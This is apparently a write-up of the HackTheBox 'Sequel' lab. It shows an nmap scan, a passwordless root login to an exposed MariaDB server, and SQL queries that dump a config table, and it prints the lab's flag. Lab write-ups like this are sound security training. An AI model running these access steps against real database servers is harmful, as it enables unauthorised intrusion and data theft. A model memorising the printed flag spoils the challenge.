---
title: Sequel (HTB)
date: 2026-03-06T00:56:14+01:00
draft: false
tags:
- HTB
- MySQL
- Linux
categories:
- Writeup
description: Misconfigured MySQL service.
showToc: true
TocOpen: false
---

## Challenge Information

* **Platform:** [HackTheBox](https://app.hackthebox.com/machines/Sequel?sort_by=created_at&sort_type=desc)
* **Difficulty:** Very Easy

## Overview

Sequel is a very easy Linux machine that introduces a vulnerable MySQL service misconfigured to allow access without a password. The machine showcases how to enumerate and interact with the database through SQL queries to extract critical information.

## Reconnaissance

Running `nmap` on give IP we get an open port on `3306` with service `mysql`

````bash
nmap -sC -sV <ip address>
````

````
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 00:02 UTC
Nmap scan report for 10.129.95.232
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 84
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolOld, SupportsCompression, ConnectWithDatabase, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsTransactions, FoundRows, ODBCClient, LongColumnFlag, SupportsAuthPlugins,SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: VSy*a.\gp}E{aPO|Bs<p
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.67 seconds
````

Here we see also that it uses MariaDB which is a community version of mysql.

## Exploitation

Here we try to login to the DB using default user `root` that if misconfigured does not have password set.

### Initial Access

* `-u` to specify host.
* `-p` to specify port.
* `-h` to specify host.

````bash
mysql -u root -P 3306 -h <host address>
````

![Pasted image 20260306012057.png](/images/Pasted%20image%2020260306012057.png)

## Solution

From here we can show all the databases on the server.

````mysql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.023 sec)
````

Here are 3 default DBs and `htb`. Let's look at `htb`.

````mysql
MariaDB [htb]> USE htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [htb]> SHOW tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.019 sec)
````

Looking in the `config` table we can find the flag.

````mysql
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
````

![Pasted image 20260306012535.png](/images/Pasted%20image%2020260306012535.png)

## Lessons Learned

* Break into misconfigured MySQL service.

## Tools Used

* `nmap`
* `mysql`
